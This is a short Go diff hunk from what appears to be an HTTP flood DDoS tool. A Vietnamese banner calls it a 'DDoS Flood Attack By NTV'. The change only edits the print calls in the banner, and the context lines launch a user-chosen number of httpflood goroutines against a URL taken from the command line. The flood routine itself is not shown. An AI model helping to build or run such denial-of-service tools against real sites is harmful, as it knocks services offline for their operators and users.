@@ -32,15 +32,15 @@ func main(){
   target.url = os.Args[1]
   target.method = os.Args[2]
   threads, _ := strconv.Atoi(os.Args[3])
-  Println("Đang Khởi Động")
-  Println(" [..              [..") 
-  Println(" [..              [.. ")
-  Println(" [..[.. [..       [..[. [...   [.. ") 
-  Println(" [.. [..  [.. [.. [.. [..    [..  [..") 
-  Println(" [.. [..  [..[.   [.. [..   [..   [..")
-  Println(" [.. [..  [..[.   [.. [..   [..   [..") 
-  Println(" [..[...  [.. [.. [..[...     [.. [...")
-  Println("              Tấn Công DDoS Flood By NTV ")
+  fmt.Print("Đang Khởi Động")
+  fmt.Print(" [..              [..") 
+  fmt.Print(" [..              [.. ")
+  fmt.Print(" [..[.. [..       [..[. [...   [.. ") 
+  fmt.Print(" [.. [..  [.. [.. [.. [..    [..  [..") 
+  fmt.Print(" [.. [..  [..[.   [.. [..   [..   [..")
+  fmt.Print(" [.. [..  [..[.   [.. [..   [..   [..") 
+  fmt.Print(" [..[...  [.. [.. [..[...     [.. [...")
+  fmt.Print("              Tấn Công DDoS Flood By NTV ")
    for i:=0; i < threads; i++{
      go httpflood()
    }
